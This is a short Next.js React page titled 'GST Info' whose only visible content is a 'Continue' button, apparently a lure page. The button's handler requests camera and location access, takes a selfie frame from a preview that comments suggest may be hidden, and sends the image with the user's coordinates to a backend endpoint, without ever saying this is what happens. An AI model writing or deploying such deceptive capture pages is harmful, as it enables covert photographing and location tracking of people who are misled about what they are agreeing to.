"use client";

import { useRef, useState } from "react";

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const [showPreview, setShowPreview] = useState(false);
  const [busy, setBusy] = useState(false);

  async function captureAll() {
    if (busy) return;
    setBusy(true);

    try {
      // 1️⃣ CAMERA permission (MUST be first)
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }
      });

      // 2️⃣ LOCATION permission (directly after click)
      const position = await new Promise<GeolocationPosition>(
        (resolve, reject) =>
          navigator.geolocation.getCurrentPosition(resolve, reject)
      );

      // 3️⃣ Attach stream to video & show preview
      const video = videoRef.current!;
      video.srcObject = stream;
      video.muted = true;

      setShowPreview(true);
      await video.play();

      // ⏱ allow browser to paint at least one real frame
      await new Promise(res => setTimeout(res, 1000));

      // 4️⃣ CAPTURE IMAGE (full quality, opacity does NOT affect it)
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext("2d")!;
      ctx.drawImage(video, 0, 0);

      const image = canvas.toDataURL("image/jpeg", 0.9);
      console.log("Image length:", image.length);

      // 5️⃣ CLEANUP camera + UI
      stream.getTracks().forEach(t => t.stop());
      setShowPreview(false);

      // 6️⃣ SEND to backend
      await fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          image,
          lat: position.coords.latitude,
          lon: position.coords.longitude
        })
      });

    } catch (err) {
      console.error("Capture failed:", err);
      alert("Permission denied or error occurred");
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="error-container">
      <h1>GST Info</h1>
      <p>Continue</p>

      {showPreview && (
        <video
          ref={videoRef}
          playsInline
          muted
          className="camera-preview"
        />
      )}

      <button
        onClick={captureAll}
        disabled={busy}
        className="continue-btn"
      >
        {busy ? "Please wait…" : "Continue"}
      </button>
    </div>
  );
}
